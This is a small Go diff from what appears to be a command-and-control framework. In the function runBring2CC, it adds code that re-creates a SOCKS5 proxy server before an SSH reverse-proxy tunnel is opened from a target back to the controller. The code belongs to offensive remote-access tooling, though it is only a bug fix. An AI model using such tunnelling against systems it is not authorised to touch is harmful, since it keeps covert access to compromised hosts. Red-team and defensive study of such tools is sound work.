@@ -165,6 +165,14 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		cancel()
 		return
 	}
+	if def.ProxyServer == nil {
+		def.ProxyServer, err = common.NewSocks5ProxyServer()
+		if err != nil {
+			c2transport.NotifyC2(cmd, "Error re-initializing ProxyServer: %v\n", err)
+			cancel()
+			return
+		}
+	}
 	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &modules.ReverseConns, modules.ReverseConnsMutex, def.ProxyServer, ctx, cancel)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "%v\n", err)
